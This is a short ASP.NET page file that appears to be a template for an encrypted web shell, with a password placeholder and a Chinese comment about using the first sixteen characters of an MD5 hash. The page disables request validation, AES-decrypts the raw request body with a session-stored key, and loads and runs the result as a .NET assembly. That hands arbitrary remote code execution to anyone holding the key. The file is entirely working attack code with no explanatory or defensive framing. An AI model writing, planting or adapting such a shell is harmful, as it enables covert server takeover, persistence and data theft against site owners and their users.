<%@ Page Language="C#" validateRequest="false" %>
<%@Import Namespace="System.Reflection"%>
<%
Session.Add("k","${pwd}");//md5前十六位
byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);
Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);
%>